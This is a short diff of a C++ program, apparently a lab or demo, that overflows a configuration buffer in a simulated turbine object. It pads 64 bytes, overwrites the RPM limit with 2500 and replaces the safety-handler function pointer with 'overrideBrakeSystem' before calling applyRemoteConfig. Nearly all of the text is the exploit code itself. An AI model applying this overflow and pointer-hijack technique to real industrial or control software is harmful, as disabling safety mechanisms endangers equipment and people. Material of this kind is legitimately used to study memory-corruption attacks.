@@ -33,11 +33,10 @@ int main() {
 
     std::cout << "[Before] RPM limit: " << turbine.rpmLimit << "\n";
     std::cout << "[Before] SafetyHandler @ " << (void*)turbine.safetyHandler << "\n";
-
+  //  char payload[64];
     char payload[80];
     memset(payload, 'A', 64);
-   *(int*)(payload + 64) = 2500;
-    *(int*)(payload + 4) = 2500;
+   *(int*)(payload + 64) = 2500;   
    *(void (**)(void))(payload + 72) = overrideBrakeSystem;
     
     turbine.applyRemoteConfig(payload, sizeof(payload));
